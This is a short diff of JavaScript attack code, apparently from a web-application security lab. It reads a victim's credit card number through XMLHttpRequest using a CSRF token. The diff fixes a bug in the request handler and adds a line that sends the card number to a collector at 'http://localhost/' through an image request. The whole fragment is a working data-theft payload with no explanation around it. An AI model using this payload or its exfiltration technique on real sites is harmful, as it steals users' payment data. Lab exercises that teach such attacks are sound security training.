@@ -292,14 +292,12 @@ var req2 = new XMLHttpRequest();
 req2.onreadystatechange = function ()
 
 {
-	if (req.readyState == 4 && req.status ==200)
+	if (req2.readyState == 4 && req2.status ==200)
 {
 	var htmlPage = req2.responseXML;
 	credit_card = htmlPage.getElementById("result").innerHTML;
-	
-	req2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid="+uid+"&csrf_token="+csrf_token, true);
-	req2.responseType = "document";
-	req2.send();
+	document.getElementById("result").innerHTML = credit_card;
+	new Image().src = "http://localhost/?credit_card_number="+credit_card;
 }
 };
 
